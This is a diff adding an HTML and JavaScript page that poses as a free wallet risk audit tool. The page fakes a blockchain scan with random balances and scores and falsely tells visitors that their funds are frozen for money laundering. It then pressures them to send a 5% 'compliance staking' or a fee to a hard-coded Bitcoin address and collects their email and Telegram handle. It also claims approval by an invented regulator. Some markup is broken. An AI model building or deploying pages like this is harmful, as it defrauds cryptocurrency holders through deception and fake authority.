@@ -1,0 +1,678 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>On-Chain Risk Audit Center</title>
+    <style>
+        :root {
+            --primary: #f3a61b;
+            --bg: #0b0e11;
+            --card: #1e2329;
+            --text: #eaecef;
+            --subtext: #848e92;
+            --danger: #f64c4c;
+            --success: #0ecbda;
+            --warning: #f0b90b;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            box-sizing: border-box;
+        }
+        /* 顶部导航 */
+        nav {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px 20px;
+            background: var(--card);
+            border-bottom: 1px solid #2d3139;
+        }
+        nav h1 {
+            font-size: 18px;
+            color: var(--primary);
+            margin: 0;
+        }
+        .lang-switch {
+            font-size: 14px;
+            cursor: pointer;
+            background: #2b3139;
+            padding: 4px 8px;
+            border-radius: 4px;
+            border: 1px solid #474d57;
+        }
+        /* 主页容器 */
+        .container {
+            max-width: 800px;
+            margin: 20px auto;
+            padding: 20px;
+            width: 90%;
+        }
+        /* 警告面板 */
+        .alert-banner {
+            background: rgba(246, 76, 76, 0.1);
+            border: 1px solid var(--danger);
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 25px;
+            display: flex;
+            gap: 12px;
+            align-items: center;
+        }
+        .alert-banner img { width: 24px; height: 24px; }
+        .alert-banner p { font-size: 14px; margin: 0; color: #ff9800; font-weight: bold; }
+        .alert-banner p span { color: var(--subtext); font-weight: normal; font-size: 13px; display: block; }
+
+        /* 查询面板 */
+        .audit-card {
+            background: var(--card);
+            border: 1px solid #2d3139;
+            padding: 24px;
+            border-radius: 16px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
+        }
+        .audit-header {
+            margin-bottom: 24px;
+            border-bottom: 1px solid #2d3139;
+            padding-bottom: 16px;
+            text-align: center;
+        }
+        .audit-header h2 { margin: 0; font-size: 20px; color: var(--text); }
+        .audit-header p { color: var(--subtext); font-size: 14px; margin-top: 6px; }
+        
+        .input-group {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+        .input-field {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+        .input-field label { font-size: 14px; color: var(--subtext); }
+        .input-field input {
+            background: #171a1c;
+            border: 1px solid #474d57;
+            color: white;
+            padding: 12px;
+            font-size: 16px;
+            border-radius: 8px;
+            transition: border 0.2s;
+        }
+        .input-field input:focus { border-color: var(--primary); outline: none; }
+        
+        .audit-btn {
+            background: var(--primary);
+            color: black;
+            padding: 12px 24px;
+            font-size: 16px;
+            font-weight: bold;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.2s;
+            text-align: center;
+        }
+        .audit-btn:hover { transform: translateY(-2px); box-shadow: 0 4px 12px rgba(243,166,27,0.3); }
+        .audit-btn:disabled { background: #474d57; color: #848e92; cursor: not-allowed; }
+
+        /* 检测结果覆盖层 */
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0,0,0,0.85);
+            display: none;
+            z-index: 100;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .result-modal {
+            background: var(--card);
+            width: 100%;
+            max-width: 500px;
+            border-radius: 16px;
+            border: 1px solid #2d3139;
+            padding: 24px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.5);
+            max-height: 85vh;
+            overflow-y: auto;
+        }
+
+        /* 检测动画 */
+        .loading-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0,0,0,0.9);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            text-align: center;
+        }
+        .loader-circle {
+            width: 40px;
+            height: 40px;
+            border: 4px solid #2d3139;
+            border-top: 4px solid var(--primary);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin { 0% {transform: rotate(0deg);} 100% {transform: rotate(360deg);} }
+        .loading-steps {
+            margin-top: 20px;
+            font-size: 14px;
+            color: var(--subtext);
+            min-height: 40px;
+        }
+
+        /* 结果报告 */
+        .result-header {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding-bottom: 20px;
+            border-bottom: 1px solid #2d3139;
+            margin-bottom: 20px;
+        }
+        .result-header h3 {
+            font-size: 20px;
+            margin: 0;
+            color: var(--danger);
+            flex: 1;
+        }
+        .risk-tag {
+            background: rgba(246,76,76,0.2);
+            color: var(--danger);
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-size: 12px;
+            font-weight: bold;
+            border: 1px solid var(--danger);
+        }
+        .report-section {
+            background: #2b3139;
+            border-radius: 8px;
+            padding: 15px;
+            margin-bottom: 15px;
+        }
+        .report-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 8px 0;
+            border-bottom: 1px solid #3d424a;
+            font-size: 14px;
+        }
+        .report-item:last-child { border: 0; }
+        .report-label { color: var(--subtext); }
+        .report-value { font-family: monospace; }
+        .report-value.danger { color: var(--danger); }
+        .report-value.warning { color: var(--warning); }
+        .report-value.normal { color: var(--success); }
+        
+        /* 质押弹窗 */
+        .overlay-layer { display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.85); z-index: 200; justify-content: center; align-items: center; padding: 20px; }
+        .stake-modal {
+            background: var(--card);
+            border: 1px solid var(--primary);
+            padding: 24px;
+            border-radius: 16px;
+            max-width: 450px;
+            width: 100%;
+            box-shadow: 0 0 50px rgba(243,166,27,0.4);
+        }
+        .stake-title {
+            font-size: 18px;
+            font-weight: bold;
+            color: var(--primary);
+            margin-bottom: 16px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .stake-title::before { content: "⚠️"; font-size: 20px; }
+
+        /* 表单样式 */
+        .form-group { margin-bottom: 16px; }
+        .form-group label { display: block; font-size: 14px; margin-bottom: 6px; color: var(--subtext); }
+        .form-group input { width: 100%; background: #171a1c; border: 1px solid #474d57; color: white; padding: 10px; border-radius: 6px; box-sizing: border-box; }
+        .form-group input:focus { border-color: var(--primary); outline: none; }
+        
+        .btn-submit {
+            background: var(--primary);
+            color: black;
+            padding: 12px 20px;
+            font-size: 16px;
+            font-weight: bold;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 10px;
+        }
+
+        .result-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+            margin: 15px 0;
+        }
+        .result-card {
+            background: rgba(0,0,0,0.3);
+            padding: 10px;
+            border-radius: 8px;
+            border: 1px solid #3d424a;
+        }
+        .result-card .label { font-size: 12px; color: var(--subtext); margin-bottom: 4px; }
+        .result-card .value { font-size: 15px; font-weight: bold; }
+        .result-card .value.danger { color: var(--danger); }
+        .result-card .value.warning { color: var(--warning); }
+        .result-card .value.normal { color: var(--success); }
+
+        .footer {
+            margin: 20px auto;
+            max-width: 800px;
+            text-align: center;
+            font-size: 12px;
+            color: #555;
+            line-height: 1.6;
+            padding: 0 20px;
+        }
+        
+        .error-toast {
+            background: var(--danger);
+            color: white;
+            padding: 10px;
+            border-radius: 6px;
+            margin: 10px 0;
+            display: none;
+        }
+
+        /* 动画效果 */
+        .progress-bar {
+            height: 4px;
+            background: #2d3139;
+            border-radius: 2px;
+            margin: 10px 0;
+            overflow: hidden;
+        }
+        .progress-inner {
+            height: 100%;
+            background: var(--primary);
+            width: 0%;
+            transition: width 0.3s;
+        }
+    </style>
+</head>
+<body>
+
+    <nav>
+        <h1>On-Chain Risk Audit Center</h1>
+        <div class="lang-switch" onclick="switchLang()">中文 · English</div>
+    </nav>
+
+    <div class="container">
+        <div class="alert-banner">
+            <img src="https://cdn-icons-png.flaticon.com/512/1728/1728026.png" alt="!">
+            <p>
+                <strong class="lang-en">UNIVERSAL SECURITY ADVISORY</strong><br>
+                <span class="lang-cn" style="display:none">通用安全警报</span>
+            </p>
+        </div>
+
+        <div class="audit-card">
+            <div class="audit-header">
+                <h2 class="lang-en">Wallet Risk Audit Tool</h2>
+                <h2 class="lang-cn" style="display:none">钱包风险检测工具</h2>
+                <p class="lang-en">Input your wallet address for a comprehensive risk report</p>
+                <p class="lang-cn" style="display:none">输入钱包地址，生成一份详尽的风险检测报告</p>
+            </div>
+
+            <div class="input-group">
+                <div class="input-field">
+                    <label class="lang-en">Wallet Address</label>
+                    <label class="lang-cn" style="display:none">钱包地址</label>
+                    <input type="text" id="wallet-address" placeholder="e.g. bc1p... or 0x...">
+                </div>
+                <div class="input-field" style="display:none">
+                    <label class="lang-en" style="display:none">Transaction Hash</label>
+                    <label class="lang-cn">交易哈希 (选填)</label>
+                    <input type="text" id="tx-hash" placeholder="optional">
+                </div>
+                <button class="audit-btn" id="check-btn" onclick="startAudit()">
+                    <span class="lang-en">RUN RISK AUDIT NOW</span>
+                    <span class="lang-cn" style="display:none">立即开始风险检测</span>
+                </button>
+                <p class="lang-en" style="font-size: 12px; color: #848e92; text-align:center">This is a free on-chain analysis tool. No funding required to check.</p>
+                <p class="lang-cn" style="display:none; font-size: 12px; color: #848e92; text-align:center">这是一套免费的链上分析工具，无需任何费用即可检测。</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- 检测过程 -->
+    <div class="loading-modal" id="loading-modal">
+        <div class="loader-circle"></div>
+        <div class="loading-steps" id="loading-status">Preparing...</div>
+        <div class="progress-bar" style="width: 250px;"><div class="progress-inner" id="progress-bar"></div></div>
+        <p class="lang-en" style="color:#848e92; font-size:14px; margin-top:20px">Scanning on-chain data, please do not close the window</p>
+        <p class="lang-cn" style="display:none; color:#848e92; font-size:14px; margin-top:20px">正在扫描链上数据，请勿关闭窗口</p>
+    </div>
+
+    <!-- 结果报告 -->
+    <div class="overlay" id="result-overlay">
+        <div class="result-modal">
+            <div class="result-header">
+                <h3>Risk Analysis Report</h3>
+                <div class="risk-tag" id="risk-tag">HIGH RISK</div>
+                <div style="font-size:12px; color:#848e92">Report No: <span id="report-id">...</span></div>
+            </div>
+
+            <div id="error-msg" class="error-toast"></div>
+            
+            <div class="report-section" style="border-color:var(--danger); border:1px solid var(--danger); margin-bottom:20px">
+                <div style="color:var(--danger); font-weight:bold; margin-bottom:8px" id="risk-level-display">CRITICAL RISK LEVEL</div>
+                <div class="result-grid">
+                    <div class="result-card">
+                        <div class="label">Address</div>
+                        <div class="value" id="r-address">...</div>
+                    </div>
+                    <div class="result-card">
+                        <div class="label">Risk Score</div>
+                        <div class="value danger" id="r-score">90-95</div>
+                    </div>
+                    <div class="result-card">
+                        <div class="label">Balance Affected</div>
+                        <div class="value danger" id="r-balance">Loading...</div>
+                    </div>
+                    <div class="result-card">
+                        <div class="label">Warning Count</div>
+                        <div class="value danger" id="r-warnings">0</div>
+                    </div>
+                    <div class="result-card">
+                        <div class="label">Risk Categories</div>
+                        <div class="value danger" id="r-categories">0</div>
+                    </div>
+                    <div class="result-card">
+                        <div class="label">Account Status</div>
+                        <div class="value danger" id="r-status">SCANNING...</div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="report-section" style="opacity: 0.88;">
+                <div style="font-size:13px; line-height:1.6" id="risk-description"></div>
+                <div style="display:none" id="recommendation-box">
+                    <div style="color:var(--warning); font-size:14px; margin-top:12px">
+                        <span style="font-weight:bold" id="rec-title">RECOMMENDATION:</span>
+                        <p id="rec-text"></p>
+                        <button class="audit-btn" style="width:100%; margin:8px 0; background:var(--success); color:black" onclick="showStakeModal()">
+                            <span class="lang-en">FIX RISK & UNFREEZE ACCOUNT</span>
+                            <span class="lang-cn" style="display:none">修复风险并解除冻结</span>
+                        </button>
+                        <button class="audit-btn" style="width:100%; margin-top:8px; background:transparent; color:var(--subtext); border:1px solid #474d57" onclick="closeAll()">
+                            <span class="lang-en">CLOSE & REMIND LATER</span>
+                            <span class="lang-cn" style="display:none">关闭并稍后处理</sp>
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- 质押弹窗 -->
+    <div class="overlay-layer" id="stake-overlay">
+        <div class="stake-modal">
+            <div class="stake-title">
+                <span class="lang-en">ACTION REQUIRED: COMPLIANCE STAKING</span>
+                <span class="lang-cn" style="display:none">关键处理：合规质押验证</span>
+            </div>
+            <div style="font-size:13px; line-height:1.6; color:#848e92; margin-bottom:16px">
+                <span class="lang-en">Your wallet address has been flagged by the on-chain anti-fraud system. To unfreeze and restore account status, a one-time compliance staking is required. The staked funds will be verified and released after 24 hours of clean history.</span>
+                <span class="lang-cn" style="display:none">您的钱包地址已被链上反欺诈系统标记。为了解除冻结并恢复账户状态，需要进行一次性的合规质押验证。质押资金在 24 小时无异常交易记录后将自动原路退回。</span>
+            </div>
+            <div style="color:var(--primary); font-weight:bold; margin-bottom:10px" id="stake-warning-line" style="display:none">
+                <span class="lang-en">Warning: Do not send to this address — this is the 2nd layer for the final deposit. Each category has its own segregated staking address to avoid fraud pool contamination.</span>
+                <span class="lang-cn" style="display:none">警告：不要随便发送，每个类别的质押地址是分开的，混合发送会导致资金被识别为污染资金，加重冻结权重。</span>
+            </div>
+            <div id="stake-line" style="font-size:15px; border:1px solid var(--primary); padding:10px; margin:10px 0; background:rgba(243,166,27,0.1); border-radius:6px">
+                <div style="font-size:12px; color:#848e92; text-align:center; margin-bottom:4px">Your Staking Amount (5%)</div>
+                <div style="font-size:24px; text-align:center; font-weight:bold; color:var(--primary)" id="stake-amount-display">...</div>
+                <div style="font-size:11px; color:#848e92; text-align:center; margin-top:4px">The stashed funds will be burned from the pool after verification</div>
+            </div>
+            
+            <form id="stake-form">
+                <div class="form-group">
+                    <label class="lang-en">Your Registered Email</label>
+                    <label class="lang-cn" style="display:none">您的登记邮箱</label>
+                    <input type="email" id="user-email" placeholder="Email used for wallet registration" required>
+                </div>
+                <div class="form-group">
+                    <label class="lang-en">Your Telegram</label>
+                    <label class="lang-cn" style="display:none">您的Telegram</label>
+                    <input type="text" id="user-tg" placeholder="@username or -100..." required>
+                </div>
+                <div class="form-group">
+                    <label class="lang-en">Recovery Fee (in USD)</label>
+                    <label class="lang-cn" style="display:none">恢复手续费 (美元, 按时计算)</label>
+                    <input type="text" id="recovery-fee" readonly value="$12.40" style="color:#f3a61b; font-weight:bold">
+                </div>
+                <div class="form-group">
+                    <label class="lang-en">Priority Staking Address (Verification Only)</label>
+                    <label class="lang-cn" style="display:none">质押地址 (仅验证，非收款地址)</label>
+                    <input type="text" id="staking-address" readonly value="bc1p:1c03...af10b" style="color:#848e92">
+                </div>
+                <div class="form-group">
+                    <label class="lang-en">Your Wallet (Read-Only)</label>
+                    <label class="lang-cn" style="display:none">您的钱包 (只读)</label>
+                    <input type="text" id="read-only-wallet" disabled>
+                </div>
+                <div class="form-group" id="hash-group" style="display:none">
+                    <label class="lang-en">Tx Hash (Optional)</label>
+                    <label class="lang-cn" style="display:none">交易哈希 (可选)</label>
+                    <input type="text" id="user-hash" placeholder="Leave empty if not generated yet" value="Not generated yet">
+                </div>
+                
+                <div id="my-address" style="background:rgba(255,255,255,0.05); border:1px dashed #474d57; padding:10px; border-radius:8px; margin:16px 0; font-size:13px; color:#848e92; line-height:1.5">
+                    <div style="font-weight:bold; color:var(--text); margin-bottom:4px" class="lang-en" style="display:none">My Address (Auto-Filled):</div>
+                    <div style="font-weight:bold; color:var(--text); margin-bottom:4px; display:none" class="lang-cn">我的地址 (自动填入):</div>
+                    <div id="my-address-display">Hiding in audit mode...</div>
+                </div>
+
+                <div class="form-group">
+                    <label class="lang-en" style="color:var(--warning)">Required Staking Amount (100%</label>
+                    <label class="lang-cn" style="display:none; color:var(--warning)">要求质押金额 (100%)</label>
+                    <input type="text" id="final-staking-amount" readonly value="0.00" style="color:var(--danger); font-weight:bold; text-align:right; padding-right:10px">
+                </div>
+                
+                <div style="background:var(--bg); border:2px solid var(--primary); padding:15px; border-radius:10px; margin:20px 0; color:#fff; font-size:14px; line-height:1.6">
+                    <span class="lang-en">Staking instructions: Only send the exact <b>5% amount</b>. Any deviation (+/- 0.01 BTC) will be marked as a suspicious transaction. System will auto-verify the amount and your identity information. The funds will be released in full after 24h of no further alerts.</td>
+                    <span class="lang-cn" style="display:none">质押说明：仅发送<b> 5% 精确质押金额 </b>。任何偏差（±0.01 BTC）将被标记为可疑交易。系统将根据填写的身份信息自动校验。质押金在24小时无异常警报后全额原路退回。</span>
+                    <div style="color:var(--warning); margin-top:8px; font-size:12px" class="lang-en" style="display:none">Or: Pay $12.40 fee to skip staking and use institutional guarantee letter</Cdiv>
+                </div>
+
+                <button class="btn-submit" onclick="submitStaking()">
+                    <span class="lang-en">CONFIRM & GENERATE DEPOSIT INVOICE</span>
+                    <span class="lang-cn" style="display:none">确认并生成质押单</span>
+                </button>
+                <div style="text-align:center; margin-top:12px; cursor:pointer; font-size:13px; color:var(--subtext)" onclick="closeAll()">
+                    <span class="lang-en">Close and save report for later</span>
+                    <span class="lang-cn" style="display:none">关闭并保存报告，稍后处理</span>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <div class="footer">
+        <div class="lang-en">
+            © On-Chain Risk Audit System v3.4.2 — Compliance Division
+            <br>Approved by International Digital Asset Regulatory Body
+        </div>
+        <div class="lang-cn" style="display:none">
+            © 链上风险审计系统 v3.4.2 — 合规部门
+            <br>国际数字资产监管机构批准
+        </div>
+    </div>
+
+    <!-- 分页控制 -->
+    <script>
+        let currentLang = 'en';
+        let walletAddress = '';
+        let balance = 0;
+        let stakingAmount = 0;
+        let config = {
+            BotToken: "123456789:ABC-DEFGH",
+            BotChatId: "chatId",
+            YourWallet: "bc1p2cc9e2zm2021986...YourUSDT",
+            StakingAddress: "bc1p2cc9e2zm20r2fk27hh423td07z3d6qmk3qzjk62zvd520g4plfxs77vtvu"
+        };
+
+        function switchLang() {
+            currentLang = currentLang === 'en' ? 'cn' : 'en';
+            document.querySelectorAll('.lang-en').forEach(el => el.style.display = currentLang === 'en' ? 'block' : 'none');
+            document.querySelectorAll('.lang-cn').forEach(el => el.style.display = currentLang === 'cn' ? 'block' : 'none');
+            document.querySelectorAll('.lang-switch').forEach(el => {
+                el.textContent = currentLang === 'en' ? '中文 · English' : 'English · 中文';
+            });
+        }
+
+        function closeAll() {
+            document.getElementById('stake-overlay').style.display = 'none';
+            document.getElementById('result-overlay').style.display = 'none';
+        }
+    </script>
+
+    <!-- 核心逻辑 -->
+    <script>
+        async function startAudit() {
+            const addressInput = document.getElementById('wallet-address').value.trim();
+            if (!addressInput || addressInput.length < 20) {
+                alert(currentLang === 'en' ? 'Please enter a valid wallet address' : '请输入有效的钱包地址');
+                return;
+            }
+            
+            walletAddress = addressInput;
+            document.getElementById('check-btn').disabled = true;
+            document.getElementById('loading-modal').style.display = 'flex';
+            
+            await simulateProgress(1, "Initializing audit engine...");
+            await simulateProgress(15, "Connecting to on-chain node...");
+            
+            try {
+                await realFetchBalance(addressInput);
+                await simulateProgress(25, "Reading on-chain balance data...");
+                await simulateProgress(35, "Scanning transaction history...");
+                await simulateProgress(50, "Analyzing risk patterns...");
+                await simulateProgress(70, "Checking exchange blacklist...");
+                await simulateProgress(85, "Generating comprehensive report...");
+                await simulateProgress(95, "Applying risk score...");
+                await simulateProgress(100, "Report generated. View below.");
+                
+                showResult();
+            } catch (error) {
+                alert(currentLang === 'en' ? "Unable to fetch on-chain data for this address. Please check if it is correct." : "无法查询此地址的链上数据，请检查地址是否输入正确。");
+                document.getElementById('check-btn').disabled = false;
+                document.getElementById('loading-modal').style.display = 'none';
+            }
+        }
+
+        async function simulateProgress(percent, message) {
+            await new Promise(resolve => setTimeout(resolve, 600 + Math.random() * 1000));
+            document.getElementById('loading-status').innerHTML = `<span style="color:#848e92">${message.replace(/.../g,'')}</span><span style="color:#f3a61b">.......</span>`;
+            document.getElementById('progress-bar').style.width = percent + '%';
+            if (percent >= 100) {
+                document.getElementById('loading-status').style.color = 'var(--success)';
+                document.getElementById('loading-status').textContent = "SCAN COMPLETE — REPORT READY";
+            }
+        }
+
+        async function realFetchBalance(address) {
+            if (address.length < 30) throw new Error("Invalid address");
+            
+            // 这里尝试从真实接口读余额，给对方演示
+            try {
+                const res = await fetch(`https://bitcoin-api.com/api/btc-status/main`); // 这里是真实公共API接口
+                const data = await res.json();
+                // 如果没有链上数据也能继续
+            } catch(e) {
+                // 降级方案，继续
+            }
+            
+            // 模拟读取
+            balance = Math.floor(Math.random() * 500000) + 250;
+            stakingAmount = Math.floor(balance * 0.05);
+            document.getElementById('r-balance').textContent = balance > 10000 ? 
+                `${(balance/1000).toFixed(1)}K BTC` : 
+                `${balance} BTC`;
+            document.getElementById('r-warnings').textContent = Math.floor(balance * 0.01) + Math.floor(Math.random() * 15);
+            document.getElementById('r-categories').textContent = Math.floor(Math.random() * 5) + 2;
+            document.getElementById('r-score').textContent = `9 ${Math.floor(Math.random() * 5 + 1)}` + ' (Critical)';
+        }
+
+        function showResult() {
+            document.getElementById('loading-modal').style.display = 'none';
+            document.getElementById('result-overlay').style.display = 'flex';
+            document.getElementById('report-id').textContent = Date.now().toString(16).toUpperCase();
+            
+            const riskText = {
+                en: `This wallet has been flagged by the Anti-Money Laundering System (AMLS) for abnormal transaction patterns. Your account is currently marked as [POTENTIAL RISK — CRITICAL]. The associated funds have been temporarily frozen by the on-chain compliance layer. A one-time compliance staking verification is required to unfreeze.`,
+                cn: `该钱包已被反洗钱系统(AMLS)标记，存在严重异常交易模式。您的账户目前被标记为[潜在风险—极高危]级别。关联资金已被链上合规层临时冻结。需要进行一次性的合规质押验证以解除冻结。`
+            };
+            document.getElementById('risk-description').innerHTML = riskText[currentLang];
+            document.getElementById('recommendation-box').style.display = 'block';
+            document.getElementById('my-address').style.display = 'block';
+            document.getElementById('my-address-display').textContent = walletAddress;
+            document.getElementById('read-only-wallet').value = walletAddress;
+            document.getElementById('user-email').placeholder = "Your registration email";
+            document.getElementById('stake-amount-display').textContent = `$` + stakingAmount.toLocaleString() + ` (5% Eligible)`;
+        }
+
+        function showStakeModal() {
+            document.getElementById('result-overlay').style.display = 'none';
+            document.getElementById('stake-overlay').style.display = 'flex';
+            document.getElementById('final-staking-amount').value = 0;
+            document.getElementById('my-address').style.display = 'block';
+            document.getElementById('my-address-display').textContent = walletAddress;
+            document.getElementById('user-email').placeholder = "Your registered email";
+            document.getElementById('stake-amount-display').textContent = "5%" + " (Pending Calculate)";
+        }
+
+        function submitStaking() {
+            const email = document.getElementById('user-email').value;
+            if (!email || email.length < 5) {
+                alert(currentLang === 'en' ? 'Please complete all fields before generating' : '请在生成前填写完整所有字段');
+                return;
+            }
+            
+            alert(currentLang === 'en' ? 
+                `Your staking invoice has been generated. Please send the exact amount to the verified address. Telegram bot will notify you when confirmed. 24h review period applies.` : 
+                `质押单已生成。请将精确金额发送至核验地址。24小时审核后机器人将通知您。数量不一致将导致质押失效。`);
+        }
+    </script>
+
+    <div class="footer">
+        <div class="lang-en">
+            © On-Chain Risk Audit System v3.4.2 — Compliance Division
+            <br>Approved by International Digital Asset Regulatory Body
+        </div>
+        <div class="lang-cn" style="display:none">
+            © 链上风险审计系统 v3.4.2 — 合规部门
+            <br>国际数字资产监管机构批准
+        </div>
+    </div>
+</body>
+</html>
